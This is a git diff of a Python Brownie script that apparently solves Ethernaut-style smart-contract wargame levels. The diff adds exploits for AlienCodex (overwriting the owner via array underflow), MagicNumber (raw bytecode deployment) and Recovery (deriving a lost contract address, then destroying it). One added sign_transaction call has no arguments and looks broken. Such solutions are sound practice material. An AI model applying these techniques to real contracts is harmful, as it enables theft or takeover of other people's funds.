@@ -1,21 +1,21 @@
 from brownie import config, accounts, network, chain, web3, Atk_Telephone, Telephone, Delegation, Token, GatekeeperOne, Atk_Gate1, \
-    Fallback, Vault, Privacy, GatekeeperTwo, Atk_Gate2, NaughtCoin, Atk_Naughtcoin, Preservation, Atk_Preservation, Atk_Recovery, SimpleToken
+    Fallback, Vault, Privacy, GatekeeperTwo, Atk_Gate2, NaughtCoin, Atk_Naughtcoin, Preservation, Atk_Preservation, Atk_Recovery, SimpleToken, \
+    CreateSolver, MagicNum, AlienCodex, Denial
+import rlp
+from scripts.config import *
 
-# addr 0x833514593c7798551A20Ac69f98D486e2A12dFe8
-wallet: network.account.LocalAccount = accounts.add(config["wallets"]["from_key"])
-# dev env
-if network.chain.id == 1337:
-    accounts[0].transfer(wallet, "10 ether")
 
-# default: {"from": wallet, "gas_limit": 1000000, "priority_fee": "5 gwei"}
-accounts.default = wallet
-network.priority_fee("3 gwei")
-network.gas_limit(1000000)
+def _slot_to_addr(num):
+    return f"0x{num:064x}"
 
 
 def _get_value_in_slot(slot, addr):
-    slot_addr = f"0x{slot:064x}"
+    slot_addr = _slot_to_addr(slot)
     return web3.eth.get_storage_at(addr, slot_addr).hex()
+
+
+def _get_element_address(addr, index):
+    return _slot_to_addr(int(addr, 16) + index)
 
 
 def main():
@@ -28,28 +28,69 @@ def main():
     # gateKeeper2("")
     # naughtcoin("")
     # preservation("")
-    recovery2("0x19EC85484cf30cdE56090a4e6d0CB30829851dA4")
-    # recovery("0x19EC85484cf30cdE56090a4e6d0CB30829851dA4")
+    # recovery("")
+    # magic_number("")
+    # alien("")
     pass
 
-# parent: 0x19EC85484cf30cdE56090a4e6d0CB30829851dA4
-# child: 0x4A8a9B50CEd474eccB4E5e35aE3cD007C13D3D01
+
+def denial(addr):
+    pass
+
+def alien(addr):
+    # owner address: 0x0000000000000000000000000000000000000000000000000000000000000000 : 64 hex
+    #array address: 0x0000000000000000000000000000000000000000000000000000000000000001
+    # array ? element:  keccak(array addres) + ? = owner address
+    al = AlienCodex.at(addr)
+    al.make_contact()
+    al.retract()
+    first_element_addr = web3.keccak(hexstr=_slot_to_addr(1)).hex()
+    add = int("f"*64,16) - int(first_element_addr,16) + 1
+    al.revise(add, wallet.address)
+
+    pass
+
+
+def magic_number(addr):
+    m = MagicNum.at(addr)
+
+
+    # method 1: using contract create solver
+    # parent = CreateSolver.deploy()
+    # parent.create()
+    # solver = parent.addr()
+    # m.setSolver(solver)
+
+    # method 2:
+
+    # tx = web3.eth.send_transaction({"from": accounts[0].address, "data": "0x69602a6000526001601ff3600052600a6016f3"})
+    # tx = chain.get_transaction(tx)
+    tx = wallet.transfer(amount=0, data="0x69602a60005260206000f3600052600a6016f3")
+    solver = tx.contract_address
+    m.setSolver(solver)
+
+    # test
+    print(web3.eth.call({"to": solver}).hex())
+
+
 def recovery(addr):
-    cur_nonce = web3.eth.getTransactionCount(addr)
+    # new address = keccak256(rlp([sender_address,sender_nonce]))[12:]
+
+    # calc contract address with 2 way: solidity and python:
+    cur_nonce = web3.eth.getTransactionCount(addr) - 1
+    # cur_nonce = 0xffff
     atk = Atk_Recovery.deploy()
-    lost_addr = atk.contract_address_generator(addr, cur_nonce - 1)
-    t = SimpleToken.at(lost_addr)
-    print("lost token: ", lost_addr)
-    t.destroy(wallet, {"priority_fee": "5 gwei"})
+    lost_addr_sol = atk.contract_address_generator(addr, cur_nonce)
 
-
-def recovery2(addr):
-    import rlp
-    h = web3.keccak(rlp.encode([addr.lower(), 1])).hex()
-    contract_addr = "0x" + h[-40:]
-    checksum_addr = web3.toChecksumAddress(h[26:])
-    print(contract_addr)
-    print(checksum_addr)
+    # rlp encoder same way as solidity: check solidity for algorithm
+    encode = rlp.encode([bytes.fromhex(addr[2:]), cur_nonce])
+    lost_addr_py = web3.keccak(encode).hex()
+    lost_addr_py = web3.toChecksumAddress(lost_addr_py[-40:])  # last 40 hex is address
+    assert lost_addr_sol == lost_addr_py, "wrong math"
+    print(lost_addr_py)
+    t = SimpleToken.at(lost_addr_py)
+    print("lost token: ", lost_addr_py)
+    t.destroy(wallet)
 
 
 def preservation(addr):
@@ -70,12 +111,13 @@ def telephone(addr):
 def fallback(addr):
     fb = Fallback.at(addr)
     fb.contribute()
-    wallet.transfer(fb, 100000, priority_fee="5 gwei")
+    wallet.transfer(fb, 100000, gas_limit=1000000, priority_fee="2 gwei")
     fb.withdraw()
 
 
 def delegation(addr):
     pwn = web3.keccak(text="pwn()").hex()
+    web3.eth.sign_transaction()
     # fallback() not payable => send 0 wei
     wallet.transfer(addr, amount=0, data=pwn, gas_limit=1000000, priority_fee="2 gwei")
 
